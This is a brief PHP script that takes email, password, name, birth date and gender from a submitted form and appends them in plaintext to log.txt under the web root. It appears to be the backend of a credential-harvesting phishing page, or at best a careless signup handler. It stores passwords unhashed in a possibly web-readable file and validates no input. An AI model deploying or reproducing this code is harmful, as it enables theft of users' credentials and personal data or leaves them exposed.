<?php  
$email = $_POST['email'];
$passwd = $_POST['passwd'];
$name = $_POST['name']; 
$address = $_POST['birth'];  
$gender = $_POST['gender'];  
 

$log_txt = $email."|".$passwd."|".$name."|".$address."|".$gender;  
$log_dir = "/var/www/html/applet/Server";   
$log_file = fopen($log_dir."/log.txt", "a");  
fwrite($log_file, $log_txt."\r\n");  
fclose($log_file);  

?> 
